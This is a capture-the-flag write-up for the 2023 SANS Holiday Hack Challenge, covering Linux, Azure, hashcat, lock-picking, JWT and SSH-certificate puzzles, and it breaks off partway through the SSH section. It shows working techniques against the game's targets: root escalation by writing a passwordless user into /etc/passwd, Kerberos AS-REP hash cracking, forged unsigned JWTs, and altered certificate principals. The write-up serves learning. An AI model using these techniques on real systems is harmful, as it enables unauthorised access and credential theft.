# 2023 SANS Holiday Hack Challenge & KringleCon write-ups

## Destinations and Challenges

- Christmas Island
    - Orientation
    - Frosty's Beach
        - [Snowball Fight](#snowball-fight)
    - Santa's Surf Shack
        - [Linux 101](#linux-101)
    - Rudolph's Rest Resort
        - [Reportinator](#reportinator)
        - [Azure 101](#azure-101)
    - Rudolph's Rest Resort Lobby
        - Conversation with [Pepper Minstix](#pepper-minstix-rudolphs-rest-resort-lobby)
- Island of Misfit Toys
    - Scaredy Kite Heights
        - [Hashcat](#hashcat)
    - Ostrich Saloon
        - [Linux PrivEsc](#linux-privesc)
- Film Noir Island
    - Chiaroscuro City
        - Conversation with [Wombley Cube](#wombley-cube-chiaroscuro-city)
        - [Na'an](#naan)
    - Gumshoe Alley PI Office
        - [KQL Kraken Hunt](#kql-kraken-hunt)
    - The Blacklight District
        - [Phish Detection Agency](#phish-detection-agency)
- Pixel Island
    - Rainraster Cliffs
        - [Elf Hunt](#elf-hunt)
        - [Certificate SSHenanigans](#certificate-sshenanigans)
    - Driftbit Grotto
        - Conversation with [Tinsel Upatree](#tinsel-upatree-driftbit-grotto)
- Steampunk Island
    - Brass Bouy Port
        - [Faster Lock Combination](#faster-lock-combination)
        - [The Captain's Comms](#the-captains-comms)
    - Coggoggle Marina
        - Conversation with [Ribb Bonbowford](#ribb-bonbowford-coggoggle-marina)
        - [Active Directory](#active-directory)
    - Rusty Quay
        - Conversation with [Angel Candysalt](#angel-candysalt-rusty-quay)
        - [Game Cartridges: Vol 3](#game-cartridges-vol-3)
- Space Island
    - Spaceport Point
        - [Space Island Door Access Speaker](#space-island-door-access-speaker)
    - Cape Cosmic - nothing found

### Challenges

1. [Holiday Hack Orientation]()
1. [Snowball Fight](#snowball-fight)
1. [Linux 101](#linux-101)
1. [Reportinator](#reportinator)
1. [Azure 101](#azure-101)
1. [Luggage Lock]()
1. [Linux PrivEsc](#linux-privesc)
1. [Faster Lock Combination](#faster-lock-combination)
1. [Game Cartridges: Vol 1]()
1. [Game Cartridges: Vol 2]()
1. [Game Cartridges: Vol 3](#game-cartridges-vol-3)
1. [Na'an](#naan)
1. [KQL Kraken Hunt](#kql-kraken-hunt)
1. [Phish Detection Agency](#phish-detection-agency)
1. [Hashcat](#hashcat)
1. [Elf Hunt](#elf-hunt)
1. [Certificate SSHenanigans](#certificate-sshenanigans)
1. [The Captain's Comms](#the-captains-comms)
1. [Active Directory](#active-directory)
1. [Space Island Door Access Speaker](#space-island-door-access-speaker)
1. [Camera Access]()
1. [Missile Diversion]()

## Challenge write-ups

### Linux 101

##### Elf for Conversation
Ginger Breddie

##### Question explanation
Use Linux commands to perform the actions as directed by the prompts on the screen.

##### Solution

The illustration below contains the question prompts as comments, followed by the Linux bash command to perform the prompted action, any outputs of the commands, and notes as comments at the end of each block.

```bash
## Perform a directory listing of your home directory to find a troll and retrieve a present!
~$ ls
HELP  troll_19315479765589239  workshop

## Now find the troll inside the troll.
~$ cat troll_19315479765589239
troll_24187022596776786

## Great, now remove the troll in your home directory.
~$ rm troll_19315479765589239

## Print the present working directory using a command.
~$ pwd
/home/elf

## Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!
~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .profile  .troll_5074624024543078  HELP  workshop

## Excellent, now find the troll in your command history.
~$ history
    1  echo troll_9394554126440791
    2  ls
    3  cat troll_19315479765589239
    4  rm troll_19315479765589239
    5  pwd
    6  ls -a
    7  history

## Find the troll in your environment variables.
~$ env | grep -i troll
SESSNAME=Troll Wrangler
z_TROLL=troll_20249649541603754

## Next, head into the workshop.
~$ cd workshop/

## A troll is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the troll is in.
~/workshop$ grep -i troll toolbox_*
toolbox_191.txt:tRoLl.4056180441832623

## A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.
~/workshop$ ls -al present_engine
-r--r--r-- 1 elf elf 4990336 Dec  2 22:19 present_engine
~/workshop$ chmod +x present_engine
~/workshop$ ls -al present_engine
-r-xr-xr-x 1 elf elf 4990336 Dec  2 22:19 present_engine
~/workshop$ ./present_engine
troll.898906189498077

## Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.
~/workshop$ cd /home/elf/workshop/electrical/
~/workshop/electrical$ ls
blown_fuse0
~/workshop/electrical$ mv blown_fuse0 fuse0

## Now, make a symbolic link (symlink) named fuse1 that points to fuse0
~/workshop/electrical$ ln -s fuse0 fuse1

## Make a copy of fuse1 named fuse2.
~/workshop/electrical$ cp fuse1 fuse2
~/workshop/electrical$ ls -l
total 8
-rw-r--r-- 1 elf elf 200 Dec  2 22:19 fuse0
lrwxrwxrwx 1 elf elf   5 Dec 11 21:01 fuse1 -> fuse0
-rw-r--r-- 1 elf elf 200 Dec 11 21:02 fuse2

## We need to make sure trolls don't come back. Add the characters "TROLL_REPELLENT" into the file fuse2.
~/workshop/electrical$ echo 'TROLL_REPELLENT' >> fuse2
~/workshop/electrical$ ls -l
total 8
-rw-r--r-- 1 elf elf 200 Dec  2 22:19 fuse0
lrwxrwxrwx 1 elf elf   5 Dec 11 21:01 fuse1 -> fuse0
-rw-r--r-- 1 elf elf 216 Dec 11 21:04 fuse2

## Find the troll somewhere in /opt/troll_den.
~/workshop/electrical$ find /opt/troll_den/ -iname '*troll*'
/opt/troll_den/
/opt/troll_den/plugins/embeddedjsp/src/main/java/org/apache/struts2/jasper/compiler/ParserController.java
/opt/troll_den/apps/showcase/src/main/resources/tRoLl.6253159819943018
/opt/troll_den/apps/rest-showcase/src/main/java/org/demo/rest/example/IndexController.java
/opt/troll_den/apps/rest-showcase/src/main/java/org/demo/rest/example/OrdersController.java

## Find the file somewhere in /opt/troll_den that is owned by the user troll.
~/workshop/electrical$ find /opt/troll_den/ -user troll
/opt/troll_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/tr0LL_9528909612014411

## Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.
~/workshop/electrical$ find /opt/troll_den/ -size +$((108*1024))c -size -$((110*1024))c
/opt/troll_den/plugins/portlet-mocks/src/test/java/org/apache/t_r_o_l_l_2579728047101724

## List running processes to find another troll.
~/workshop/electrical$ ps -eaf
UID          PID    PPID  C STIME TTY          TIME CMD
init           1       0  0 20:55 pts/0    00:00:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml
elf        10151   10148  0 21:11 pts/2    00:00:00 /usr/bin/python3 /14516_troll
elf        10790     120  0 21:12 pts/3    00:00:00 ps -eaf
### Note that `ps -eaf | grep -i troll` doesn't make the challenge proceed to the next step although technically it does solve this question.

## The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.
~/workshop/electrical$ netstat -nltp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      10151/python3

## The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.
~/workshop/electrical$ curl http://0.0.0.0:54321
troll.73180338045875

## Your final task is to stop the 14516_troll process to collect the remaining presents.
~/workshop/electrical$ kill 10151

## Congratulations, you caught all the trolls and retrieved all the presents!
## Type "exit" to close...
~/workshop/electrical$ exit
```

### Azure 101

##### Elf for Conversation
Sparkle Redberry

##### Question explanation
Use Azure CLI commands to perform the actions as directed by the prompts on the screen.

##### Solution

The illustration below contains the question prompts as comments, followed by the Azure CLI command to perform the prompted action, and any outputs of the commands.

```bash
~$ az help | less

## Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )
~$ az account show | less
{
  "environmentName": "AzureCloud",
  "id": "2b0942f3-9bca-484b-a508-abdae2db5e64",
  "isDefault": true,
  "name": "northpole-sub",
  "state": "Enabled",
  "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
  "user": {
    "name": "northpole@northpole.invalid",
    "type": "user"
  }
}

## Excellent! Now get a list of resource groups in Azure.
## For more information:
## https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest
~$ az group list
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
    "location": "eastus",
    "managedBy": null,
    "name": "northpole-rg1",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  },
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2",
    "location": "westus",
    "managedBy": null,
    "name": "northpole-rg2",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  }
]

## Ok, now use one of the resource groups to get a list of function apps. For more information:
## https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest
## Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves.
~$ az functionapp list --resource-group northpole-rg1 | less
### JSON output of list of functionapps

## Find a way to list the only VM in one of the resource groups you have access to.
## For more information:
## https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest
~$ az vm list -g northpole-rg1 | less
The client 'f17559a4-d8a2-4661-ba0f-c04f8cf2926d' with object id '8deacb33-214d-4d94-9ab4-d27768410f17' does not have authorization to perform action 'Microsoft.Compute/virtualMachines/read' over scope '/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines' or the scope is invalid. If access was recently granted, please refresh your credentials.
~$ az vm list -g northpole-rg2 | less
[
    {
        ...
        "name": "NP-VM1",
        ...
    }
]

## Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM.
## For more information:
## https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke
~$ az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "ls"
{
  "value": [
    {
      "code": "ComponentStatus/StdOut/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "bin\netc\nhome\njinglebells\nlib\nlib64\nusr\n",
      "time": 1702384891
    },
    {
      "code": "ComponentStatus/StdErr/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "",
      "time": 1702384891
    }
  ]
}
```

### Hashcat

##### Elf for Conversation
Eve Snowshoes

##### Question explanation
A poem describes the presence of a Kerberos protocol hash using AS-REP (Authentication Server Response) that needs to be cracked using hashcat. It also has a few hints as listed below for using hashcat.
1. `-w 1 -u 1 --kernel-accel 1 --kernel-loops 1`
1. https://hashcat.net/wiki/doku.php?id=example_hashes
1. https://hashcat.net/wiki/doku.php?id=hashcat

At the end of the poem, the challenge asks to `Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer.`

##### Solution

The use of `hashcat` was fine-tuned iteratively. The illustration below shows all the relevant commands that were run to reach the solution.

```bash
~$ ls -l
total 12
-rw-r--r-- 1 elf  elf  1567 Nov 27 17:07 HELP
-rw-r--r-- 1 elf  elf   541 Nov  9 21:29 hash.txt
-rw-r--r-- 1 root root 2775 Nov  9 21:29 password_list.txt
~$ cat hash.txt
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966~$
~$ wc -l password_list.txt
143 password_list.txt
~$ head password_list.txt
1LuvCandyC4n3s!2022
1LuvC4ndyC4n3s!2023
1LuvC4ndyC4n3s!2021
iLuvC4ndyC4nes2024!
ILuvC4ndyC4nes2024!
iLuvC4ndyC4n3s2024!
ILuvC4ndyC4n3s2024!
iLoveC4ndyC4nes2021
ILoveC4ndyC4nes2021
iLoveC4ndyC4n3s2021

## Fine-tuning the usage of `hashcat`.
~$ hashcat hash.txt password_list.txt
hashcat (v5.1.0) starting...

* Device #1: Not a native Intel OpenCL runtime. Expect massive speed loss.
             You can use --force to override, but do not report related errors.
No devices found/left.
~$ hashcat --force hash.txt password_list.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU

Hashfile 'hash.txt' on line 1 ($krb5a...30ad0e9eafb07980d7f2e270d8dd1966): Token length exception
No hashes loaded.
~$ hashcat --force -m 18200 hash.txt password_list.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=16 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
* Device #1: Kernel m18200_a0-pure.d7bc3268.kernel not found in cache! Building may take a while...
Killed
~$ hashcat --force -m 18200 -w 1 hash.txt password_list.txt
### same output as before

~$ hashcat --force -m 18200 -w 1 -n 1 hash.txt password_list.txt
...
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966
Time.Started.....: Tue Dec 12 17:05:21 2023 (0 secs)
Time.Estimated...: Tue Dec 12 17:05:21 2023 (0 secs)
Guess.Base.......: File (password_list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1120 H/s (1.08ms) @ Accel:1 Loops:1 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 144/144 (100.00%)
Rejected.........: 0/144 (0.00%)
Restore.Point....: 0/144 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0
Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!
...
~$ hashcat --force -m 18200 -w 1 -n 1 hash.txt password_list.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU

INFO: All hashes found in potfile! Use --show to display them.
~$ hashcat --force -m 18200 -w 1 -n 1 hash.txt password_list.txt --show
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
~$ /bin/runtoanswer
What is the password for the hash in /home/elf/hash.txt ?

> IluvC4ndyC4nes!
Your answer: IluvC4ndyC4nes!

Checking....
Your answer is correct!
```

### Linux PrivEsc

##### Elf for Conversation
Rose Mold

##### Question explanation

There is a poem about privilege escalation in Linux. The task is to `Find a method to escalate privileges inside this terminal and then run the binary in /root`.

###### Hints
1. There's various ways to escalate privileges on a Linux system.
1. Using the privileged binary to overwrite a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.

##### Solution

<!-- TODO;;: get the other solution as per Hint -->

The shell snippet below shows one way of escalating privileges by adding a new password-less user with root privileges and using `su` to switch to the user.

```bash
elf@c738c70bc616:~$ ls -al /root
ls: cannot open directory '/root': Permission denied

elf@c738c70bc616:~$ find / -type f -perm -u=s 2>/dev/null -exec ls -l {} \;
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 55528 May 30  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 67816 May 30  2023 /usr/bin/su
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39144 May 30  2023 /usr/bin/umount
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 16952 Dec  2 22:17 /usr/bin/simplecopy

elf@c738c70bc616:~$ cp /etc/passwd passwd

elf@c738c70bc616:~$ head -n 2 passwd ; tail -n 2 passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/sh

elf@c738c70bc616:~$ ls -l passwd /etc/passwd
-rw-r--r-- 1 root root 961 Dec  2 22:16 /etc/passwd
-rw-r--r-- 1 elf  elf  961 Dec 12 21:35 passwd

elf@c738c70bc616:~$ echo 'elf2::0:0:root:/root:/bin/bash' >> passwd ; tail -n 2 passwd
elf:x:1000:1000::/home/elf:/bin/sh
elf2::0:0:root:/root:/bin/bash

elf@c738c70bc616:~$ cp passwd /etc/passwd
cp: cannot create regular file '/etc/passwd': Permission denied

elf@c738c70bc616:~$ simplecopy passwd /etc/passwd

elf@c738c70bc616:~$ su elf2
root@c738c70bc616:/home/elf# ls -al /root
total 620
drwx------ 1 root root   4096 Dec  2 22:17 .
drwxr-xr-x 1 root root   4096 Dec 12 21:35 ..
-rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root    161 Dec  5  2019 .profile
-rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer
root@c738c70bc616:/home/elf# /root/runmetoanswer
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

### Faster Lock Combination

##### Elf for Conversation
Bow Ninecandle

##### Question explanation
A UI contains a dial combination lock that needs to be picked. The conversation with the elf contains this [link](https://youtu.be/27rE5ZvWLU0) to a youtube video on picking such a lock.

##### Solution

__Method 1: Using the technique in the YouTube video__

1. Get the sticky number

    Drag the shackle up to medium-high tension while using the arrow keys to turn the dial. For a few consecutive turns, note the number on the dial that is hard to get past while turning as the sticky number. Mine was 22. I'm calling this `s` for later calculations.

1. Get the guess numbers

    Reset the dial, pull up the shackle to high tension and turn the dial from the position just before 0 such that the dial's movement starts getting restricted between two or three numbers every time the shackle is on high tension. Repeat this for all numbers between 0 and 11 including both 0 and 11. The dial will be restricted between half-numbers on either side of a number for two positions. Note these two positions as the guess numbers. Mine were 4 and 9. I'm calling them `g1` and `g2` respectively, and `g` to refer to either of them, for later calculations.

1. Do the math.
   1. Find the 1st number

      Sticky number + 5 = s + 5 = 22 + 5 = 27 = `F1`

   1. Find the 3rd number

      Remainder of 1st number when divided by 4 = `F1` % 4 = 27 % 4 = 3 = `R`

      Table of guess numbers in steps of 10 for possible combinations, with respective remainders for division by 4.

      |      | `g`|`g`+10|`g`+20|`g`+30| |
      |------|----|------|------|------|-|
      |      |  4 |   14 |   24 |   34 | let's call these `G1` |
      |`G1`%4|  0 |    2 |    0 |    2 | |
      |      |  9 |   19 |   29 |   39 | let's call these `G2` |
      |`G2`%4|  1 |    3 |    1 |    3 | |

      Get two possibilities for the 3rd number by matching their remainders to `R`. These are f<sub>31</sub> = 19 and f<sub>32</sub> = 39.

      On highest shackle tension, try both the numbers on the dial. The one that feels looser will be the third number `F3`. For me, it was 19.

   1. Find 8 possibilities for the 2nd number.

      Construct a table as follows.
      First row: Start with `R` + 2, add 8 consecutively for 4 more columns. Roll over if you cross 40.
      Second row: Start with `R` + 2 + 4, add 8 consecutively for 4 more columns.

      |    | +8 | +16| +24| +32|
      |----|----|----|----|----|
      |  5 | 13 | 21 | 29 | 37 |
      |  9 | 17 | 25 | 33 |  1 |

      Out of the ten possibilities, eliminate two that are within a distance of 2 from `F3`. This eliminates 17 and 21.

1. Test out the possibilities by moving the dial.

    > _Note:_ By this step, the UI had slowed down extremely and it was very hard to input combinations. Even the correct combination would not be recognized after multiple resets.

__Method 2: Extracting values from the client-side JS__

Reviewing the client-side Javascript leads us to a variable that contains the combination. Once inside the console of the iFrame in the browser inspector, type `lock_numbers` to get the values of the lock numbers. These were mine.

```js
> lock_numbers
{"first_number": 27, "second_number": 9, "third_number": 19, "bad_third_number": 39, "first_number_sticky": 22, "guess_number1": 4, "guess_number2": 9}
```

The `first_number`, `second_number` and `third_number` combination could be tried on the lock.

If the UI is too slow or unable to recognize the input combination, run the following javascript in the same console window to complete the challenge.

```js
> first_set = true
> second_set = true
> third_set = true
> checkit()
```

### Elf Hunt

##### Elf for Conversation
Piney Sappington

##### Question explanation
A game UI portal for hunting fast moving elves requires the user to score 75 points to win the game. It seems to involve JWT manipulation to change the speed of the elves.

###### Hints
1. Unlock the mysteries of JWTs with insights from [PortSwigger's JWT Guide](https://portswigger.net/web-security/jwt).

##### Solution

__Method 1: Manipulating the JWT__

The value of the `ElfHunt_JWT` Cookie in the browser's inspector for the challenge iFrame is `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.`. The JWT contains no signature and can be directly decoded using base64 decoding or the decoder on [jwt.io](https://jwt.io/#debugger-io).

```json
{"alg":"none","typ":"JWT"}
{"speed":-500}
```

This cookie can now be replaced with a base64 encoded JWT claim containing a value of speed which is really high to brute-force shooting the elves to score, or a speed very low to play the game to shoot the elves more accurately. Once the cookie is replaced, the game needs to be reloaded.

The cookie claim can be constructed in bash using the following.

```bash
# Set a very high speed
> echo '{"speed":-10000}' | base64
eyJzcGVlZCI6LTEwMDAwfQo=
## `=` can be ignored, so the resulting JWT will be `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTEwMDAwfQo.`

# Set a very low speed
> echo '{"speed":-50}' | base64
eyJzcGVlZCI6LTUwfQo=
## the resulting JWT will be `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwfQo.`
```

__Method 2: Extracting values from the client-side JS__

Inside the iFrame's console in the browser's inspector, set the variable `score` to anything higher than 75 to complete the challenge. This is not the expected way to solve the challenge as it manipulates the challenge platform itself.

> __Note:__
> On completing the challenge, a hint to a [future challenge](#the-captains-comms) is revealed from an article called "The Captain's Journal" which mentions a `ROLE` called `GeeseIslandsSuperChiefCommunicationsOfficer`.

### Certificate SSHenanigans

##### Elf for Conversation
Alabaster Snowball

##### Question explanation

From the elf, we learn that there is an Azure server at `ssh-server-vm.santaworkshopgeeseislands.org` which uses SSH certificates and an Azure Function App at https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl that allows users to sign their SSH public keys with the SSH certificate CA. The _monitor_ user can login to the Azure server with a signed public key. Inside the server is the elf Alabaster's TODO list that may help us get access to review the Function App code. The objective is to determine the type of the implemented cookie cache.

###### Hints
1. Check out Thomas Bouve's [talk and demo](https://youtu.be/4S0Rniyidt4) to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.
1. The [get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01) Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.
1. _Hint by [Sparkle Redberry](#azure-101)_: Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the [Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token) instead.

##### Solution

1. Generate an SSH keypair as follows.

    ```bash
    $ ssh-keygen -C monitor -f monitor
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in monitor
    Your public key has been saved in monitor.pub
    The key fingerprint is:
    SHA256:65rFZJ1SZbpGBDXtUKcExAwsLvmXj0JUNJXK0UApHDk monitor
    The key's randomart image is:
    +---[RSA 3072]----+
    |     ..*B%B== .  |
          ...
    |      .+. .      |
    |      oo.        |
    +----[SHA256]-----+
    ```

1. Paste the contents of the OpenSSH public key file _monitor.pub_ into the Azure function app site and get the CA signed certificate's contents from the value of the JSON key "ssh_cert".

    > __Note:__
    > The Azure function app site makes the following API POST request when an OpenSSH public key is submitted returning a JSON containing the signed public key as an SSH certificate with the "elf" principal. The API request can be captured from the browser inspector's network log.
    >
    > ```bash
    > $ curl 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' -H 'content-type: application/json' \
    >   --data-raw '{"ssh_pub_key":"ssh-rsa AAAAB...49tufvYik= monitor"}'
    > ```
    > The request can be modified to include the desired principal instead of "elf" as follows. However, the server needs the "elf" principal for SSH.
    >
    > ```bash
    > $ curl 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' -H 'content-type: application/json' \
    >   --data-raw '{"ssh_pub_key":"ssh-rsa AAAAB...49tufvYik= monitor","principal":"monitor"}'
    > ```

1. Save the value of the "ssh_cert" key in a file called _monitor-cert.pub_. The contents can be inspected with the command, `ssh-keygen -Lf monitor-cert.pub`.

1. Use the certificate to SSH to the server. Try to find the "TODO" list.

    ```bash
    # Use any one of the following SSH command options to login. The `-vv` flag is optional for verbose logs which are omitted in later outputs.

    $ ssh -vvF /dev/null -oUserKnownHostsFile=/dev/null -i monitor -oCertificateFile=monitor-cert.pub monitor@ssh-server-vm.santaworkshopgeeseislands.org
    ...
    debug1: identity file monitor type 0
    debug1: certificate file monitor-cert.pub type 4
    ...

    # OR
    $ ssh -vvF /dev/null -oUserKnownHostsFile=/dev/null -i monitor monitor@ssh-server-vm.santaworkshopgeeseislands.org
    ...
    debug1: identity file monitor type 0
    debug1: identity file monitor-cert type 4
    ...

    # OR
    $ ssh -vvF /dev/null -oUserKnownHostsFile=/dev/null -i monitor -i monitor-cert.pub monitor@ssh-server-vm.santaworkshopgeeseislands.org
    ...
    debug1: identity file monitor type 0
    debug1: identity file monitor-cert type 4
    debug1: identity file monitor-cert.pub type 4
    debug1: identity file monitor-cert.pub-cert type -1
    ...
    ```

    Type "yes" to continue without verifying the host key.

    ```bash
    $ ssh -F /dev/null -oUserKnownHostsFile=/dev/null -i monitor monitor@ssh-server-vm.santaworkshopgeeseislands.org
    The authenticity of host 'ssh-server-vm.santaworkshopgeeseislands.org (20.253.83.128)' can't be established.
    ED25519 key fingerprint is SHA256:8c+xYRFV/F12R5iWkNmoiLYwmcJU4tzF9hnHugARFC0.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added 'ssh-server-vm.santaworkshopgeeseislands.org' (ED25519) to the list of known hosts.
    Last login: Fri Dec 15 23:27:50 2023 from 34.221.225.36
    ┌──────────────── Satellite Tracking Interface ────────────────┐
    │            ____     __ ______             __                 │
    │           / __/__ _/ //_  __/______ _____/ /__ ____          │
    │          _\ \/ _ `/ __// / / __/ _ `/ __/  '_// __/          │
    │         /___/\_,_/\__//_/ /_/  \_,_/\__/_\_\/_/              │
    │                                                              │
    ╞══════════════════════════════════════════════════════════════╡
    │                                                              │
    │  Position: 1.145136°, -145.261631°                           │
    │  Velocity: 3.0703 km/s                                       │
    │  Altitude: 35786.01 km above Earth's surface                 │
    │  Signal Strength: 87.05%                                     │
    │  Solar Panel Status: Deployed                                │
    │  Battery Status: Unknown                                     │
    │  Thermal Status: Unknown                                     │
    │                                                              │
    │          **** Geostationary orbit detected! ****             │
    │                                                              │
    └──────────────────────────────────────────────────────────────┘
    ^C
    monitor@ssh-server-vm:~$

    monitor@ssh-server-vm:~$  ps -eaf
    UID          PID    PPID  C STIME TTY          TIME CMD
    monitor        1       0  0 00:10 pts/0    00:00:00 /bin/bash -l
    monitor       17       1  0 00:10 pts/0    00:00:00 ps -eaf

    monitor@ssh-server-vm:~$  find / -iname '*todo*' 2>/dev/null
    /usr/share/vim/vim90/syntax/autodoc.vim
    /usr/share/vim/vim90/doc/todo.txt
    /usr/share/perl/5.36.0/Test/Builder/TodoDiag.pm

    monitor@ssh-server-vm:~$  env
    HOSTNAME=6f0be9823bfc
    PWD=/home/monitor
    HOME=/home/monitor
    LS_COLORS=rs=0:d ... =00;90:
    TERM=xterm
    SHLVL=1
